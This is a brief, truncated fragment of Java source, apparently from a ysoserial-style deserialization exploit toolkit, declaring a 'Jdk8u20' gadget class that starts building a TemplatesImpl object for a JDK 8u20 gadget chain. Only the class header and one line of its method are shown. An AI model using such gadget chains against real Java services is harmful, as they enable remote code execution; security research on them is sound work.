...
import yso.payloads.utils.Converter;
...
@Dependencies({"jdk:java:JDK 8u20"})
public class Jdk8u20 implements ObjectGadget {

    public Object getObject(final EXP exploitType) throws Exception {
        TemplatesImpl templates = (TemplatesImpl) Gadgets.createTemplatesImpl(exploitType);
